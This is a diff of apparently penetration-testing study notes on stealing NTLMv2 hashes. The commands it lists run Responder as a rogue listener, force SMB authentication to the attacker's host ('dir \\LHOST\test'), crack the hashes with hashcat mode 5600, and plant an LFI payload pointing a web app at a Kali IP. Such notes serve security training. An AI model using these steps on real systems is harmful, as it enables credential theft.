@@ -118,11 +118,11 @@
 
 # NTLM v2
 - More like unpriv users
-## Stealing NTLM Hashes (BANNED)
+## Stealing NTLM Hashes
 - ``` net user xxx``` see if can rdp
 - ``` sudo responder -I tun0 ``` rogue receiver to dump request from http , smb etc
 - ``` dir \\LHOST\test ``` to post hash NTLM
-- NTLM v2 Hash crack
+- NTLM v2 Hash crack ``` 5600 ```
 ### Can be abusing LFI also if LFI will use SMB or windows services
 - ``` python3 responder.py -I tun0``` alternatives app
 - e.g. ``` /index.php?view=//{kali-ip}/test
